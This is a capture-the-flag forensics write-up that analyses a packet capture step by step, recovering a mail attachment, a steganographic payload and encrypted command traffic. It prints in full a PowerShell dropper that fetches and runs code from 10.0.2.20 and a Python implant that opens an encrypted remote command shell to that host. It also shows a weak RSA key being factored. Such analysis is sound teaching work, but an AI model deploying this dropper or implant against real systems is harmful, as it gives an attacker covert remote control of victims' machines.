# Challenge

An intercepted communication between King Harald and his concubine Brunhild Deceptive seems to suggest 
that she is engaging in some form of double-dealing. 
Could it be that she is trying to infiltrate Harald's system? Is she perhaps even a potential ally?
Dig out everything you can from the intercepted communication!

Only raring.pcap is given from the start

------------------------------------------------------------------
 
### STEP 1. Open up the PCAP-file in wireshark or other analyzer 

Browse through the traffic to get an idea of what type of communication we are looking at. 
By browsing some packages we can see that this seem to be mail-traffic and also some http, and ssl traffic. 

### STEP 2. In wireshark (tshark) you can see what streams that are present with the command

```
tshark -r raring.pcap -Y "http.response" -T fields -e tcp.stream -e http.content_type
```

You will get this output (where the number is the identity of the stream)
```
2	text/html
3	text/html
3	text/css
3	text/html
2	text/html
3	text/html
2	text/html
3	application/octet-stream
8	image/jpeg
```

Stream 3 and 8 are interesting because its a file attachment and an image!

### STEP 3. What is in the application/octet-stream package? Use the -V (Verbose flag)

Use this command: 

```
tshark -r raring.pcap -Y "http.response and http.content_type contains \"application/octet-stream\"" -V
```

By examine the package header we can find out that this is a rar-file. 
[Request URI: http://mail.sekmyn.local/mail/inbound/D7A7F39A14ADB3589D191853DF307198/attachments/important.rar]
    File Data: 991 bytes

Lets extract only the data from the package by using the following command: 

```
tshark -r raring.pcap -Y "http.response and http.content_type contains \"application/octet-stream\"" -T fields -e http.file_data
```

But even better lets re-create the rar file by passing this into xxd using the following command: 

```
tshark -r raring.pcap -Y "http.response and http.content_type contains \"application/octet-stream\"" -T fields -e http.file_data | xxd -r -p > file.rar
```

### STEP 4. Extract the rar file (using unarchiver or similar)

This will reveal that the rar-file contain a script (IMPORTANT.md .cmd) 
Inside the file there is a powershell script that looks like this: 

```
@echo off
powershell.exe -command 'if ((&{python -V} 2>&1 | % gettype) -eq [System.Management.Automation.ErrorRecord]) {Invoke-WebRequest http://10.0.2.20/msupdate.msi -OutFile C:\Temp\msupdate.msi; Start-Process "C:\Temp\msupdate.exe" -WindowStyle Hidden} else {$s = (Invoke-WebRequest "http://10.0.2.20/G78GAP3GQV8B.jpg").Content; $k = $s[-4934..-2467]; $v = $s[-2467..-1]; $o = @(); for ($i = 0; $i -lt 2467; $i++) { $o += $k[$i] -bxor $v[$i]; }; $o = [System.Text.Encoding]::ASCII.GetString($o); python3 -c "$($o)"}'
```

If python is installed on this computer it will download an image. 
Inside that image there is a hidden python script that this script will try to extract and run. 
The code of the script is in two diffrent segments and is recovered by joining two lists with xor. 

Since we can see in the pcap-file that the image has been downloaded, we know that this script did run on the victims comupter.

### STEP 5. Recover the python code from the image

Create a script the extracts the code from the image. 

I created a python script decrypt_img.py in order to extract the hidden code from the image file

To extract the data from the image, the following command can be used: 

```
tshark -r raring.pcap -Y "http.response and http.content_type contains \"image/jpeg\"" -T fields -e http.file_data
```

And it can be piped into the script directly.

The python script will be visable in plain text. 

### STEP 6. Analyze the script 

Hidden code from the image:  

```
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from time import sleep
import subprocess
import socket


def encrypt_session_key(session_key: bytes) -> bytes:
    # TODO: generate new rsa key, p and q are too close..
    public_pem = '''-----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2p66AmcxzvL+l5Ib/SjM
    yVcX0PReNxuylpgqvrd6jht3s7DvUSuK0SJYJSNiIxJPBcCmwGFdA+URSVZZfH81
    UscqCGgtDfFyioAICLNQFDCedes7+5z/XXWob/0aRblifPBtg4Bw/ZOkhpCFg7BA
    C7DMO8dG1Na2gl78cOsCyms4nHtd2vXOBHHSTMz3Ua7hyZVQC97lZKuJQ65ijy3c
    dNaiZzN1J1ehUiugP39bnNSjaH8QbAdYL+TapK39KZRXjA38ndnplfFT3X17tM/j
    5YW2z6dhMZsVpDMc3CdP30r5irC5XcnRXXHbf4WTtyL2/WhEmefre9I98r1smC+B
    iwIDAQAB
    -----END PUBLIC KEY-----'''

    public_key = RSA.import_key(public_pem)
    cipher = PKCS1_OAEP.new(public_key)
    ciphertext = cipher.encrypt(session_key)
    return ciphertext


def encrypt_AES_GCM(key, plaintext):
    cipher = AES.new(key=key, mode=AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce + tag + ciphertext


def decrypt_AES_GCM(key, nonce, tag, ciphertext):
    cipher = AES.new(key=key, nonce=nonce, mode=AES.MODE_GCM)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext.decode('utf-8')


if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    session_key = get_random_bytes(16)

    while True:
        try:
            sock.connect(('10.0.2.20', 443))
            break
        except:
            sleep(60)

    rsa_blob = encrypt_session_key(session_key)
    sock.sendall(rsa_blob)

    while True:
        try:
            message = sock.recv(4096)
            if not message:
                break
            nonce = message[:16]
            tag = message[16:32]
            ciphertext = message[32:]
            command = decrypt_AES_GCM(session_key, nonce, tag, ciphertext).split()
            result = subprocess.check_output(['powershell.exe'] + command, stderr=subprocess.STDOUT)
            aes_blob = encrypt_AES_GCM(session_key, result)
            sock.sendall(aes_blob)
        except subprocess.CalledProcessError as cpe:
            aes_blob = encrypt_AES_GCM(session_key, cpe.output)
            sock.sendall(aes_blob)
        except:
            aes_blob = encrypt_AES_GCM(session_key, 'Unexpected error!'.encode())
            sock.sendall(aes_blob)
```

The script will try to connect to a remote host (10.0.2.20) on port 443 and set up a AES_GCM ecryption session.
A public RSA-key is used to encrypt a session key (16 bytes ) what will be used during the session.
This session key will be 256 bytes long when encrypted with a 2048 bytes RSA-key and it can be verified by looking at 
the SLL-packages: 

```
tshark -r raring.pcap -Y "ssl" -T fields -e ip.src -e ip.dst -e tcp
```

```
10.0.2.12	10.0.2.20	Transmission Control Protocol, Src Port: 52235, Dst Port: 443, Seq: 1, Ack: 1, Len: 256   <-- Here is the key exchange package
10.0.2.20	10.0.2.12	Transmission Control Protocol, Src Port: 443, Dst Port: 52235, Seq: 1, Ack: 257, Len: 40
10.0.2.12	10.0.2.20	Transmission Control Protocol, Src Port: 52235, Dst Port: 443, Seq: 257, Ack: 41, Len: 42
10.0.2.20	10.0.2.12	Transmission Control Protocol, Src Port: 443, Dst Port: 52235, Seq: 41, Ack: 299, Len: 44
10.0.2.12	10.0.2.20	Transmission Control Protocol, Src Port: 52235, Dst Port: 443, Seq: 299, Ack: 85, Len: 76
10.0.2.20	10.0.2.12	Transmission Control Protocol, Src Port: 443, Dst Port: 52235, Seq: 85, Ack: 375, Len: 48
10.0.2.12	10.0.2.20	Transmission Control Protocol, Src Port: 52235, Dst Port: 443, Seq: 375, Ack: 133, Len: 1527
10.0.2.20	10.0.2.12	Transmission Control Protocol, Src Port: 443, Dst Port: 52235, Seq: 133, Ack: 1902, Len: 47
10.0.2.12	10.0.2.20	Transmission Control Protocol, Src Port: 52235, Dst Port: 443, Seq: 1902, Ack: 180, Len: 2568
10.0.2.20	10.0.2.12	Transmission Control Protocol, Src Port: 443, Dst Port: 52235, Seq: 180, Ack: 4470, Len: 40
10.0.2.12	10.0.2.20	Transmission Control Protocol, Src Port: 52235, Dst Port: 443, Seq: 4470, Ack: 220, Len: 315
10.0.2.20	10.0.2.12	Transmission Control Protocol, Src Port: 443, Dst Port: 52235, Seq: 220, Ack: 4785, Len: 43
10.0.2.12	10.0.2.20	Transmission Control Protocol, Src Port: 52235, Dst Port: 443, Seq: 4785, Ack: 263, Len: 1611
10.0.2.20	10.0.2.12	Transmission Control Protocol, Src Port: 443, Dst Port: 52235, Seq: 263, Ack: 6396, Len: 49
10.0.2.12	10.0.2.20	Transmission Control Protocol, Src Port: 52235, Dst Port: 443, Seq: 6396, Ack: 312, Len: 669
10.0.2.20	10.0.2.12	Transmission Control Protocol, Src Port: 443, Dst Port: 52235, Seq: 312, Ack: 7065, Len: 55
10.0.2.12	10.0.2.20	Transmission Control Protocol, Src Port: 52235, Dst Port: 443, Seq: 7065, Ack: 367, Len: 432
10.0.2.20	10.0.2.12	Transmission Control Protocol, Src Port: 443, Dst Port: 52235, Seq: 367, Ack: 7497, Len: 61
10.0.2.12	10.0.2.20	Transmission Control Protocol, Src Port: 52235, Dst Port: 443, Seq: 7497, Ack: 428, Len: 61
```

We need to decrypt the session-key in order to decrypt the rest of the communication

### STEP 7. Find the private key 

To find the private key from a public key is challanging. 
But there is a vital flaw and clue (in the source code that we previously extracted)

   TODO: generate new rsa key, p and q are too close..
    public_pem = '''-----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2p66AmcxzvL+l5Ib/SjM
    yVcX0PReNxuylpgqvrd6jht3s7DvUSuK0SJYJSNiIxJPBcCmwGFdA+URSVZZfH81
    UscqCGgtDfFyioAICLNQFDCedes7+5z/XXWob/0aRblifPBtg4Bw/ZOkhpCFg7BA
    C7DMO8dG1Na2gl78cOsCyms4nHtd2vXOBHHSTMz3Ua7hyZVQC97lZKuJQ65ijy3c
    dNaiZzN1J1ehUiugP39bnNSjaH8QbAdYL+TapK39KZRXjA38ndnplfFT3X17tM/j
    5YW2z6dhMZsVpDMc3CdP30r5irC5XcnRXXHbf4WTtyL2/WhEmefre9I98r1smC+B
    iwIDAQAB
    -----END PUBLIC KEY-----'''

The key is not properly generated due to that p and q values are to close. 

With a tool like RsaCtfTool can be used to derive the private key from a weak key like this

```
python3.9 RsaCtfTool.py --publickey public.pem --private
```

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA2p66AmcxzvL+l5Ib/SjMyVcX0PReNxuylpgqvrd6jht3s7Dv
USuK0SJYJSNiIxJPBcCmwGFdA+URSVZZfH81UscqCGgtDfFyioAICLNQFDCedes7
+5z/XXWob/0aRblifPBtg4Bw/ZOkhpCFg7BAC7DMO8dG1Na2gl78cOsCyms4nHtd
2vXOBHHSTMz3Ua7hyZVQC97lZKuJQ65ijy3cdNaiZzN1J1ehUiugP39bnNSjaH8Q
bAdYL+TapK39KZRXjA38ndnplfFT3X17tM/j5YW2z6dhMZsVpDMc3CdP30r5irC5
XcnRXXHbf4WTtyL2/WhEmefre9I98r1smC+BiwIDAQABAoIBAGTUJBILqis6YzVg
y8vcz2Zk5rUWn4VnHtzZ3Y0MblewT2ruxdF39ZQy9NhcE1z9iriqe73qqc2sDmb2
jlsfCGbfOIGcGnt9ykgaeJoaqWpGai8UiRuo8xYVt9O+tilGMShScw/dYz9wosb1
TL7JwSAjMG65n+91/8LtMBycJzNXmhIKLSd1fQwPybhCVGhFlnHceNqzD1WbVOZc
MfplQ+jHxMnNByUMPLd7zdPK50K20G5eknOTRaT9GkNrQGmxTs5qHmqNS0WOGgOQ
fchQiTu1X860BYjrjnrRcHPxsHoISdT7e06znJQpDfIwbBtZfLM07TZbFqEb75h4
Y/u+0vECgYEA7JKoIbvSDTvLbRI5xy4GYnJwzNF+DKLOvHoy1NUNBRqtQRpR2jXQ
f2NYSxHFW4bFcB8jSosxjhOQqG/Or8KAPy/Xec7ibel5B6HmHoVctTzXcKfBcgl1
v+oi/pg2S2qJO83ge6wjP2lVRG3vacfCgPrx269IbkvZXVvjOXSuIUUCgYEA7JKo
IbvSDTvLbRI5xy4GYnJwzNF+DKLOvHoy1NUNBRqtQRpR2jXQf2NYSxHFW4bFcB8j
SosxjhOQqG/Or8KAPy/Xec7ibel5B6HmHoVctTzXcKfBcgl1v+oi/pg2S2qJO83g
e6wjP2lVRG3vacfCgPrx269IbkvZXVvjOXSv/I8CgYAfpZLGSHjV+lzBL4H5KigC
fWqni5LAH/tl7Tblj8aZGzN4FQxEE5Tbpa+HA06Satn4oMG41BwB9I4SajqM+ojr
avv5OHrD10qwgbDl/lMjj4sGb/qJxcgxryGVS0lgF1VaYbUY9jMU5YNZjxdK4EUd
ufQmvjEDSDRAr+0an4g3vQKBgG1GUONEHoJ+XDjFcmrOl6RhuDjji5XKnjPxPgmR
X7I74EtyHNzufqBZAy+pxb/BQPHJcEO+h+VYpDkpbA9DiHmnX6CkL3MVpRIhdmoi
r/AHanxfALvsIrfDLubq6CltzHYTYt29ZYqk3P3+ydfSrcVmJNGU5aAM6Rp2lz6y
55eBAoGAerwrZsrctkICQ6sU2B6MtwyWj98WZ36XWdaVy53GSE8QyvAc3pNWRwvl
LOI/YDO4+aI75g3R/r4r4gRjZH4yGlfryKdzHbaPlflaJ/4JT3RnXR0GiqlvY5KL
VytARt3uEYeWA9hFR16VPH6knZf3gjY0K4rkxLmDt1LOXA8QpTE=
-----END RSA PRIVATE KEY-----

### STEP 8. Decrypt the session key and the messages 

Now we can use the private RSA-key to decrypt the 16 byte session key. 
It is in the first package in the stream and all the following packages are encrypted with that key. 
Each message after the first one will have a nonce and a tag that is inluded in the beginning of the package (16+16).

I wrote a python script that use the hexdump from tshark to first derive the sessionkey 
and then encrypt all the following messages. 

This command can be used to run the script with the correct hex-data from tshark:

```
tshark -r raring.pcap -Y "tls && ip.addr == 10.0.2.20" -V -T fields -e tcp.payload | python3.9 decrypt_messages.py
```

### STEP 9. Retrieve the flag

The flag is in the last message in the SSL stream. 


